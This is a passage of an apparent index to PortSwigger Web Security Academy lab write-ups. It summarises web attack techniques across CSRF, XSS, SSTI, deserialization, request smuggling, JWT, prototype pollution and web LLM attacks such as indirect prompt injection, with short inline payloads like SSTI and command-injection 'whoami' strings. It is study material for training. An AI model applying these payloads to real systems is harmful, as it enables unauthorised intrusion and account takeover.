    - Bypassing SameSite Lax by using `_method=POST` as parameter in `GET` request 
- [SameSite Strict bypass via client-side redirect](/PortSwigger/Client_Side/CSRF/SameSite_Strict_bypass_via_client-side_redirect.md)
    - Using path traversal to exploit client-side redirect and change victim's email
- [SameSite Strict bypass via sibling domain](/PortSwigger/Client_Side/CSRF/SameSite_Strict_bypass_via_sibling_domain.md)
    - Cross Site Websocket Hijacking - CSWSH
    - Using XSS on sibling domain to bypass Strict SameSite and exfiltrate data over CSWSH
- [SameSite Lax bypass via cookie refresh](/PortSwigger/Client_Side/CSRF/SameSite_Lax_bypass_via_cookie_refresh.md)
    - Lax for first 2 minutes after loggng in is not enforced by browser
    - Popup blocker bypass via `window.onclick`
- [CSRF where Referer validation depends on header being present](/PortSwigger/Client_Side/CSRF/CSRF_where_Referer_validation_depends_on_header_being_present.md)
    - Ommiting `Referer` header allows to send valid change email request
- [CSRF with broken Referer validation](/PortSwigger/Client_Side/CSRF/CSRF_with_broken_Referer_validation.md)
    - Domain must be in `Referer` header in order to send valid change email request
    - Using `history.pushState()` to prepare URL for `Referer` header


## Cross-origin resource sharing (CORS)
- [CORS vulnerability with basic origin reflection](/PortSwigger/Client_Side/CORS/CORS_vulnerability_with_basic_origin_reflection.md)
    - Origin reflection
- [CORS vulnerability with trusted null origin](/PortSwigger/Client_Side/CORS/CORS_vulnerability_with_trusted_null_origin.md)
    - Trusted null origin
- [CORS vulnerability with trusted insecure protocols](/PortSwigger/Client_Side/CORS/CORS_vulnerability_with_trusted_insecure_protocols.md)
    - Reflected XSS in `productId`
    - Using XSS to steal API key from trusted subdomain

## Clickjacking
- [Basic clickjacking with CSRF token protection](/PortSwigger/Client_Side/Clickjacking/Basic_clickjacking_with_CSRF_token_protection.md)
    - Basic clickjacking
- [Clickjacking with form input data prefilled from a URL parameter](/PortSwigger/Client_Side/Clickjacking/Clickjacking_with_form_input_data_prefilled_from_a_URL_parameter.md)
    - Prepopulation of `email` field via `GET` parameter
- [Clickjacking with a frame buster script](/PortSwigger/Client_Side/Clickjacking/Clickjacking_with_a_frame_buster_script.md)
    - Using `allow-forms` or `allow-scripts` to bypass frame buster script
- [Exploiting clickjacking vulnerability to trigger DOM-based XSS](/PortSwigger/Client_Side/Clickjacking/Exploiting_clickjacking_vulnerability_to_trigger_DOM-based_XSS.md)
    - Using DOM XSS in `/feedback?name=<XSS>&email=...` to perform clickjacking
- [Multistep clickjacking](/PortSwigger/Client_Side/Clickjacking/Multistep_clickjacking.md)
    - 2 buttons clickjacking attack

## DOM-based vulnerabilities
- [DOM XSS using web messages](/PortSwigger/Client_Side/DOM-based_vulnerabilities/DOM_XSS_using_web_messages.md)
    - DOM XSS - `this.contentWindow.postMessage('<img src=0 onerror=print()>','*')`
- [DOM XSS using web messages and a JavaScript URL](/PortSwigger/Client_Side/DOM-based_vulnerabilities/DOM_XSS_using_web_messages_and_a_JavaScript_URL.md)
    - DOM XSS - `this.contentWindow.postMessage('javascript:print()//http:','*')`
- [DOM-based open redirection](/PortSwigger/Client_Side/DOM-based_vulnerabilities/DOM-based_open_redirection.md)
    - Open redirection via `/post?postId=1&url=...`
- [DOM XSS using web messages and JSON.parse](/PortSwigger/Client_Side/DOM-based_vulnerabilities/DOM_XSS_using_web_messages_and_JSON_parse.md)
    - DOM XSS -`this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")`
- [DOM-based cookie manipulation](/PortSwigger/Client_Side/DOM-based_vulnerabilities/DOM-based_cookie_manipulation.md)
    - DOM XSS - `/product?productId=1&'><script>print()</script>`
    - Stroring XSS payload in `lastViewedProduct` cookie
    - Poisoning cookie with XSS payload and trigerring it via `iframe src=... onload=...`

## WebSockets
- [Manipulating WebSocket messages to exploit vulnerabilities](/PortSwigger/Client_Side/WebSockets/Manipulating_WebSocket_messages_to_exploit_vulnerabilities.md)
    - XSS via websocket messages
- [Cross-site WebSocket hijacking](/PortSwigger/Client_Side/WebSockets/Cross-site_WebSocket_hijacking.md)
    - CSWSH
- [Manipulating the WebSocket handshake to exploit vulnerabilities](/PortSwigger/Client_Side/WebSockets/Manipulating_the_WebSocket_handshake_to_exploit_vulnerabilities.md)
    - Using `X-Forwarded-For` to bypass IP blacklist
    - XSS with case sensitive protection bypass - `<img src=0 oNeRrOr=alert`0`>`











# Advanced Topics
## Insecure deserialization
- [Modifying serialized objects](/PortSwigger/Advanced_topics/Insecure_deserialization/Modifying_serialized_objects.md)
    - Session cookie in PHP serialization format
    - Changing username to adrminitrator
- [Modifying serialized data types](/PortSwigger/Advanced_topics/Insecure_deserialization/Modifying_serialized_data_types.md)
    - Session cookie in PHP serialization format
    - Using different data type in seralized data - strings vs integer
- [Using application functionality to exploit insecure deserialization](/PortSwigger/Advanced_topics/Insecure_deserialization/Using_application_functionality_to_exploit_insecure_deserialization.md)
    - Session cookie in PHP serialization format
    - Path traversal via `avatar_link`
    - Using delete account request to delete file
- [Arbitrary object injection in PHP](/PortSwigger/Advanced_topics/Insecure_deserialization/Arbitrary_object_injection_in_PHP.md)
    - Session cookie in PHP serialization format
    - Creating custom object to delete target file based on provided source code
- [Exploiting Java deserialization with Apache Commons](/PortSwigger/Advanced_topics/Insecure_deserialization/Exploiting_Java_deserialization_with_Apache_Commons.md)
    - Session cookie in Java's Apache Commons serialization format
    - Using Ysoserial to create gadget chain and gain RCE
- [Exploiting PHP deserialization with a pre-built gadget chain](/PortSwigger/Advanced_topics/Insecure_deserialization/Exploiting_PHP_deserialization_with_a_pre-built_gadget_chain.md)
    - Session cookie in PHP serialization format
    - File `phpinfo.php` is accessible for everyone. It contains `SECRET_KEY`
    - Using Phpggc to create gadget chain and gain RCE
- [Exploiting Ruby deserialization using a documented gadget chain](/PortSwigger/Advanced_topics/Insecure_deserialization/Exploiting_Ruby_deserialization_using_a_documented_gadget_chain.md)
    - Session cookie in Ruby serialization format (marshaled)
    - File `phpinfo.php` is accessible for everyone. It contains `SECRET_KEY`
    - Using "Universal Deserialisation Gadget for Ruby 2.x-3.x" to create gadget chain and gain RCE

## Web LLM attacks
- [Exploiting LLM APIs with excessive agency](/PortSwigger/Advanced_topics/Web_LLM_attacks/Exploiting_LLM_APIs_with_excessive_agency.md)
    - LLM can reveal information about its functions and APIs
- [Exploiting vulnerabilities in LLM APIs](/PortSwigger/Advanced_topics/Web_LLM_attacks/Exploiting_vulnerabilities_in_LLM_APIs.md)
    - Exploiting RCE by providing email `$(whoami)@example.com`
- [Indirect prompt injection](/PortSwigger/Advanced_topics/Web_LLM_attacks/Indirect_prompt_injection.md)
    - Placing payload inside LLM data source allows to bypass restrictions

## GraphQL API vulnerabilities
- [Accessing private GraphQL posts](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/Accessing_private_GraphQL_posts.md)
    - Using introspection query to get GraphQL structure
    - Revealing private posts
- [Accidental exposure of private GraphQL fields](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/Accidental_exposure_of_private_GraphQL_fields.md)
    - Using introspection query to get GraphQL structure
    - Changing administrator's password
- [Finding a hidden GraphQL endpoint](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/Finding_a_hidden_GraphQL_endpoint.md)
    - Adding `\n` after `__schema` to execute introspection query
    - Deleting user
- [Bypassing GraphQL brute force protections](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/Bypassing_GraphQL_brute_force_protections.md)
    - Using introspection query to get GraphQL structure
    - Bypassing brute force rate limiting by using aliases
- [Performing CSRF exploits over GraphQL](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/Performing_CSRF_exploits_over_GraphQL.md)
    - Using introspection query to get GraphQL structure
    - Using `Content-Type: x-www-form-urlencoded` instead of JSON to bypass CORS
    - Performing CSRF attack to change user's email

## Server-side template injection
- [Basic server-side template injection](/PortSwigger/Advanced_topics/Server-side_template_injection/Basic_server-side_template_injection.md)
    - Embedded Ruby (ERB) template engine
    - SSTI in `/?message=<%= whoami %>`
- [Basic server-side template injection (code context)](/PortSwigger/Advanced_topics/Server-side_template_injection/Basic_server-side_template_injection_(code_context).md)
    - Tornado template engine
    - SSTI in `POST` request with `blog-post-author-display=user.name}}{% import os %}{{os.system('whoami')`
- [Server-side template injection using documentation](/PortSwigger/Advanced_topics/Server-side_template_injection/Server_side_template_injection_using_documentation.md)
    - FreeMarker Java Template Engine
    - SSTI in content manager with `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }`
- [Server-side template injection in an unknown language with a documented exploit](/PortSwigger/Advanced_topics/Server-side_template_injection/Server_side_template_injection_in_an_unknown_language_with_a_documented_exploit.md)
    - Handlebars template engine
    - Using fuzzstring to detect template engine
    - SSTI in `/?message=...` (RCE)
- [Server-side template injection with information disclosure via user-supplied objects](/PortSwigger/Advanced_topics/Server-side_template_injection/Server_side_template_injection_with_information_disclosure_via_user-supplied_objects.md)
    - Jinja2 template engine
    - Using fuzzstring to detect template engine
    - SSTI in content manager 
    - Retrieval of framework's secret key

## Web cache poisoning
- [Web cache poisoning with an unkeyed header](/PortSwigger/Advanced_topics/Web_cache_poisoning/Web_cache_poisoning_with_an_unkeyed_header.md)
    - Responses to requests with data in `X-Forwarded-Host` is reflected in cached response
    - Polluting cache to serve malicious script from attacker's server
- [Web cache poisoning with an unkeyed cookie](/PortSwigger/Advanced_topics/Web_cache_poisoning/Web_cache_poisoning_with_an_unkeyed_cookie.md)
    - Responses to requests with data in cookie `fehost=xyz"}</script><script>alert(1)//` are cached
    - Polluting cache to serve malicious script directly
- [Web cache poisoning with multiple headers](/PortSwigger/Advanced_topics/Web_cache_poisoning/Web_cache_poisoning_with_multiple_headers.md)
    - Responses to requests with data in `X-Forwarded-Host` are cached, which allows overwrite domain hosting script files
    - Polluting cache to serve malicious script from attacker's server
- [Targeted web cache poisoning using an unknown header](/PortSwigger/Advanced_topics/Web_cache_poisoning/Targeted_web_cache_poisoning_using_an_unknown_header.md)
    - Using `ParamMiner` to identify hidden headers
    - Responses to requests with data in `X-host` are cached, which allows overwrite domain hosting script files
    - Polluting cache to serve malicious script from attacker's server
- [Web cache poisoning via an unkeyed query string](/PortSwigger/Advanced_topics/Web_cache_poisoning/Web_cache_poisoning_via_an_unkeyed_query_string.md)
    - Using `ParamMiner` to identify cache buster - `Origin` header
    - Responses to requests with data in paramters are cached
    - Polluting cache to serve malicious script directly
- [Web cache poisoning via an unkeyed query parameter](/PortSwigger/Advanced_topics/Web_cache_poisoning/Web_cache_poisoning_via_an_unkeyed_query_parameter.md)
    - Using `ParamMiner` to identify unkeyed GET parameters - `utm_content`
    - Responses to requests with data in paramter `utm_content` are cached
    - Polluting cache to serve malicious script directly
- [Parameter cloaking](/PortSwigger/Advanced_topics/Web_cache_poisoning/Parameter_cloaking.md)
    - Using `ParamMiner` to identify unkeyed GET parameters - `utm_content`
    - Using paramter cloaking to cache responses with malicious script - `utm_content=test;callback=alert(1)//` is not considered as part of cache key, even though it is used to modify response from `/js/geolocate.js` endpoint
    - Polluting cache to serve malicious script by exploiting XSS in one of the js files
- [Web cache poisoning via a fat GET request](/PortSwigger/Advanced_topics/Web_cache_poisoning/Web_cache_poisoning_via_a_fat_GET_request.md)
    - Responses to `Fat GET` requests (`GET` with data in body) are cached 
    - Polluting cache to serve malicious script directly
- [URL normalization](/PortSwigger/Advanced_topics/Web_cache_poisoning/URL_normalization.md)
    - XSS in path in 404 reponses
    - 404 responses to requests to non existing paths are cached
    - Browser encodes and disables XSS payload if provided in URL
    - Polluting cache to serve malicious, unencoded script directly via 404 response

## HTTP Host header attacks
- [Basic password reset poisoning](/PortSwigger/Advanced_topics/HTTP_Host_header_attacks/Basic_password_reset_poisoning.md)
    - Using attacker's server in `Host` header creates reset password link with his server
- [Host header authentication bypass](/PortSwigger/Advanced_topics/HTTP_Host_header_attacks/Host_header_authentication_bypass.md)
    - Using `Host: localhost` allows to access admin endpoint
- [Web cache poisoning via ambiguous requests](/PortSwigger/Advanced_topics/HTTP_Host_header_attacks/Web_cache_poisoning_via_ambiguous_requests.md)
    - Using second `Host` header makes application source js files from second location
    - Responses to requests with 2 `Host` headers are cached
    - Polluting cache to serve malicious script from attacker's server
- [Routing-based SSRF](/PortSwigger/Advanced_topics/HTTP_Host_header_attacks/Routing-based_SSRF.md)
    - Using `Host: <IP>` to acess internal host
- [SSRF via flawed request parsing](/PortSwigger/Advanced_topics/HTTP_Host_header_attacks/SSRF_via_flawed_request_parsing.md)
    - Providing full URL in path and setting `Host` header to collabolator domain allows to reach collabolator domain.
    - Using full URL in path and setting `Host` header to internal IP allows to reach admin endpoint
- [Host validation bypass via connection state attack](/PortSwigger/Advanced_topics/HTTP_Host_header_attacks/Host_validation_bypass_via_connection_state_attack.md)
    - Sending 2 requests in single connection allows to bypass `Host` header validation
    - Using internal IP in second request allows to access admin endpoint

## HTTP request smuggling
- [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP_request_smuggling,_confirming_a_CL.TE_vulnerability_via_differential_responses.md)
    - Determining what the front-end and back-end is using
    - Using `CL.TE` to smuggle request
- [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP_request_smuggling,_confirming_a_TE.CL_vulnerability_via_differential_responses.md)
    - Determining what the front-end and back-end is using
    - Using `TE.CL` to smuggle request
- [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Exploiting_HTTP_request_smuggling_to_bypass_front-end_security_controls,_CL.TE_vulnerability.md)
    - Determining what the front-end and back-end is using
    - Using `CL.TE` to smuggle request
    - Using `x=` to ignore the rest of following request
- [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Exploiting_HTTP_request_smuggling_to_bypass_front-end_security_controls,_TE.CL_vulnerability.md)
    - Determining what the front-end and back-end is using
    - Using `TE.CL` to smuggle request
    - Using `x=` to ignore the rest of following request
- [Exploiting HTTP request smuggling to reveal front-end request rewriting](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Exploiting_HTTP_request_smuggling_to_reveal_front-end_request_rewriting.md)
    - Determining what the front-end and back-end is using
    - Leaking headers added by front-end via `search=` reflection
    - Using `CL.TE` to smuggle request
- [Exploiting HTTP request smuggling to capture other users' requests](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Exploiting_HTTP_request_smuggling_to_capture_other_users'_requests.md)
    - Determining what the front-end and back-end is using
    - Leaking victim's request via comment functionality

- [Exploiting HTTP request smuggling to deliver reflected XSS](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Exploiting_HTTP_request_smuggling_to_deliver_reflected_XSS.md)
    - Determining what the front-end and back-end is using
    - Reflected XSS in `User-Agent` - `User-Agent: "/><script>alert(1)</script>`
    - Adding malicious `User-Agent` value to smuggled request
    - Using `CL.TE` to poison request queue
- [Response queue poisoning via H2.TE request smuggling](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Response_queue_poisoning_via_H2.TE_request_smuggling.md)
    - Determining what the back-end is using (CL/TE) - HTTP2 downgrade
    - Using `H2.TE` to poison response  queue
- [H2.CL request smuggling](/PortSwigger/Advanced_topics/HTTP_request_smuggling/H2.CL_request_smuggling.md)
    - Determining what the back-end is using (CL/TE) - HTTP2 downgrade
    - Using `H2.CL` to poison victim's request and serve to victim malicious js payload
- [HTTP/2 request smuggling via CRLF injection](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP2_request_smuggling_via_CRLF_injection.md)
    - Determining what the back-end is using (CL/TE) - HTTP2 downgrade
    - Determining what the back-end is using (header with CRLF with CL/TE) - HTTP2 downgrade
    - Leaking victim's request via comment functionality
    - Using `H2.TE` to poison request queue
- [HTTP/2 request splitting via CRLF injection](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP2_request_splitting_via_CRLF_injection.md)
    - Determining what the back-end is using (CL/TE) - HTTP2 downgrade
    - Request splitting - placing `HTTP/1.1` request in  `HTTP/2` header  using CRLF
    - Using requset splitting to smuggle request
- [CL.0 request smuggling](/PortSwigger/Advanced_topics/HTTP_request_smuggling/CL.0_request_smuggling.md)
    - Using `CL.0`  to smuggle request
- [HTTP request smuggling, basic CL.TE vulnerability](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP_request_smuggling,_basic_CL.TE_vulnerability.md)
    - Determining what the front-end and back-end is using
    - Using `CL.TE` to smuggle request
- [HTTP request smuggling, basic TE.CL vulnerability](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP_request_smuggling,_basic_TE.CL_vulnerability.md)
    - Determining what the front-end and back-end is using
    - Using `TE.CL` to smuggle request
- [HTTP request smuggling, obfuscating the TE header](/PortSwigger/Advanced_topics/HTTP_request_smuggling/HTTP_request_smuggling,_obfuscating_the_TE_header.md)
    - Determining what the front-end and back-end is using
    - Obfuscation of `Transfer-Encoding` header
    - Using `CL.TE` to smuggle request

## OAuth authentication
- [Authentication bypass via OAuth implicit flow](/PortSwigger/Advanced_topics/OAuth_2.0_authentication_vulnerabilities/Authentication_bypass_via_OAuth_implicit_flow.md)
    - Attacker can access victim's account by sending request with victim's email addres
- [SSRF via OpenID dynamic client registration](/PortSwigger/Advanced_topics/OAuth_2.0_authentication_vulnerabilities/SSRF_via_OpenID_dynamic_client_registration.md)
    - Disclosure of OpenId configuration - Registration endpoint
    - SSRF via `logo_uri`
- [Forced OAuth profile linking](/PortSwigger/Advanced_topics/OAuth_2.0_authentication_vulnerabilities/Forced_OAuth_profile_linking.md)
    - Lack of `state` parameter in linking process
    - Using `/oauth-linking?code=<attacker_code>` to perform CSRF on linking account process
    - Account hijaking
- [OAuth account hijacking via redirect_uri](/PortSwigger/Advanced_topics/OAuth_2.0_authentication_vulnerabilities/OAuth_account_hijacking_via_redirect_uri.md)
    - Modification of `redirect_uri` result in browser making request to provided domain with authorization code
    - Account hijacking
- [Stealing OAuth access tokens via an open redirect](/PortSwigger/Advanced_topics/OAuth_2.0_authentication_vulnerabilities/Stealing_OAuth_access_tokens_via_an_open_redirect.md)
    - Open redirect in `/post/next?path=<URL>`
    - Modification of `redirect_uri` - path traversal and open redirect - result in browser making request to provided domain with authorization code in fragment
    - Account hijacking

## JWT
- [JWT authentication bypass via unverified signature](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_unverified_signature.md)
    - Modification of JWT payload
- [JWT authentication bypass via flawed signature verification](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_flawed_signature_verification.md)
    - Modification of JWT payload
    - Deletion of JWT signature part
- [JWT authentication bypass via weak signing key](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_weak_signing_key.md)
    - Breaking with hashcat weak HS256 key
    - Modification and signing of JWT 
- [JWT authentication bypass via jwk header injection](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_jwk_header_injection.md)
    - Modification of JWT header and payload
    - Injecting JWK header
- [JWT authentication bypass via jku header injection](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_jku_header_injection.md)
    - Modification of JWT header and payload
    - Injecting JKU header
- [JWT authentication bypass via kid header path traversal](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_kid_header_path_traversal.md)
    - Modification of JWT header and payload
    - Path Traversal in `kid` - pointing to `/dev/null`
    - Signing token with null key
- [JWT authentication bypass via algorithm confusion](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_algorithm_confusion.md)
    - Modification of JWT header and payload
    - Algorithm confusion - public key is treated as symmetric key and therefore attacker can crate valid signature
- [JWT authentication bypass via algorithm confusion with no exposed key](/PortSwigger/Advanced_topics/JWT/JWT_authentication_bypass_via_algorithm_confusion_with_no_exposed_key.md)
    - Modification of JWT header and payload
    - Deriving public key from 2 JWT signatures
    - Algorithm confusion - public key is treated as symmetric key and therefore attacker can crate valid signature

## Prototype pollution
- [Client-side prototype pollution via browser APIs](/PortSwigger/Advanced_topics/Prototype_pollution/Client-side_prototype_pollution_via_browser_APIs.md)
    - Prototype pollution via `document.createElement('script');` - `/?__proto__[value]=data:,alert(1);`
- [DOM XSS via client-side prototype pollution](/PortSwigger/Advanced_topics/Prototype_pollution/DOM_XSS_via_client-side_prototype_pollution.md)
    - Prototype pollution via `document.createElement('script');` - `/?__proto__[transport_url]=data:,alert(1);`
- [DOM XSS via an alternative prototype pollution vector](/PortSwigger/Advanced_topics/Prototype_pollution/DOM_XSS_via_an_alternative_prototype_pollution_vector.md)
    - Prototype poluttion via `eval()` - `/?__proto__.sequence=alert(1)-`
- [Client-side prototype pollution via flawed sanitization](/PortSwigger/Advanced_topics/Prototype_pollution/Client-side_prototype_pollution_via_flawed_sanitization.md)
    - Lack of recursive sanitication
    - Prototype pollution via `document.createElement('script');` - `?__pro__proto__to__[transport_url]=data:,alert(1);`
- [Client-side prototype pollution in third-party libraries](/PortSwigger/Advanced_topics/Prototype_pollution/Client-side_prototype_pollution_in_third-party_libraries.md)
    - Prototype poluttion via `location.hash` - `/#__proto__[hitCallback]=alert(document.cookie)`
- [Privilege escalation via server-side prototype pollution](/PortSwigger/Advanced_topics/Prototype_pollution/Privilege_escalation_via_server-side_prototype_pollution.md)
    - Modification of `isAdmin` variable
- [Detecting server-side prototype pollution without polluted property reflection](/PortSwigger/Advanced_topics/Prototype_pollution/Detecting_server-side_prototype_pollution_without_polluted_property_reflection.md)
    - Detecting of server-side prototype pollution
- [Bypassing flawed input filters for server-side prototype pollution](/PortSwigger/Advanced_topics/Prototype_pollution/Bypassing_flawed_input_filters_for_server-side_prototype_pollution.md)
    - Detecting of server-side prototype pollution
    - Using `constructor.prototype.foo=bar` to bypass sanitization
- [Remote code execution via server-side prototype pollution](/PortSwigger/Advanced_topics/Prototype_pollution/Remote_code_execution_via_server-side_prototype_pollution.md)
    - RCE via `"execArgv": ["--eval=require('child_process').execSync('whoami')"]`
- [Exfiltrating sensitive data via server-side prototype pollution](/PortSwigger/Advanced_topics/Prototype_pollution/Exfiltrating_sensitive_data_via_server-side_prototype_pollution.md)
    - RCE via `"shell": "vim", "input": whoami\n`

